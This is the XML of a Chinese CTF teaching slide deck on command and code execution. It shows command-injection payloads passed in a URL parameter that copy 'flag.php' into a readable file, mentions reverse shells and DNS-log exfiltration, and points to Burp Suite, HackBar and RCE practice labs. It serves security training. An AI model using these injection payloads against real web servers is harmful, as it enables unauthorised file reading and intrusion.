            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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和重定向</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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98030" y="197802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dirty="0"/>
              <a:t>ls | tee a #</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>将</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的结果输入文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ip?a=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ls | tee 1.txt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lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ip/1.txt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98030" y="402336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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cp flag.php 1.txt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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mv flag.php 1.txt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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat flag.php &gt; 1.txt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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat flag.php &gt;&gt; 1.txt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98030" y="549783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000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>反弹</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dnslog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>外带的方法感兴趣的同学可自行了解</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="20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工具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743075" y="1403985"/>
            <a:ext cx="1654175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burpsuite</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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96935" y="1403985"/>
            <a:ext cx="1487170" cy="460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HackBar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="24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26580" y="1942465"/>
            <a:ext cx="48571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/>
              <a:t>可以在浏览器的扩展里搜索下载，使用说明：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>https://blog.csdn.net/2302_82189125/article/details/137762983</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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0850" y="3033395"/>
            <a:ext cx="5095875" cy="280416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11860" y="1942465"/>
            <a:ext cx="43980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dirty="0"/>
              <a:t>下载链接和使用说明：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>https://m5e1ff9fy3.feishu.cn/wiki/FCzcwm5OziTCgYk81WOcwJXinNf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="图片 11"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="657860" y="3143250"/>
            <a:ext cx="4318000" cy="2789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544320" y="2291715"/>
            <a:ext cx="872934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 dirty="0"/>
              <a:t>访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" dirty="0"/>
              <a:t>https://www.qsnctf.com/#/main/driving-range?page=1&amp;category=&amp;difficulty=&amp;keyword=RCE-labs&amp;user_answer=&amp;user_favorite=&amp;tag_ids=</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>自行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>练习【</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" dirty="0"/>
              <a:t>RCE-labs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>】</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" dirty="0"/>
              <a:t>Level 1,3,4,5,7,8,9</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3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89.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag2.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:389.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag3.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:389.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag4.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:389.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag5.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:389.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag6.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:389.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag7.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:389.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag8.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:389.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag9.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:389.7,&quot;left&quot;:43.15,&quot;top&quot;:99.5,&quot;width&quot;:883.75}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag10.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="COMMONDATA" val="eyJoZGlkIjoiODEyYmZmZGRjNzBkOTkwMWU5MjMzY2I3Y2EzZDY4ZWEifQ=="/>
</p:tagLst>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="主题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Microsoft YaHei"/>
        <a:cs typeface=""/>
      </a:majorFont>
      <a:minorFont>
        <a:latin typeface="Times New Roman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毕业主题5</Template>
  <TotalTime>0</TotalTime>
  <Words>3993</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>263</Paragraphs>
  <Slides>15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Times New Roman</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>主题5</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>代码执行 vs 命令执行</vt:lpstr>
      <vt:lpstr>代码执行与命令执行的关系</vt:lpstr>
      <vt:lpstr>常用命令执行函数</vt:lpstr>
      <vt:lpstr>常用命令执行函数</vt:lpstr>
      <vt:lpstr>命令连接符</vt:lpstr>
      <vt:lpstr>命令连接符</vt:lpstr>
      <vt:lpstr>常用代码执行函数</vt:lpstr>
      <vt:lpstr>过滤绕过</vt:lpstr>
      <vt:lpstr>过滤绕过</vt:lpstr>
      <vt:lpstr>过滤绕过</vt:lpstr>
      <vt:lpstr>过滤绕过</vt:lpstr>
      <vt:lpstr>拓展：无回显rce</vt:lpstr>
      <vt:lpstr>工具</vt:lpstr>
      <vt:lpstr>练习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Hannibal0x</dc:creator>
  <cp:lastModifiedBy>张嘉杰</cp:lastModifiedBy>
  <cp:revision>5452</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-06-10T04:51:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-16T12:57:25Z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  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-12.1.0.23542</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="ICV">
    <vt:lpwstr>E0828584C356420EA2D6B16AB4D5A84D_13</vt:lpwstr>
  </property>
</Properties>
</file>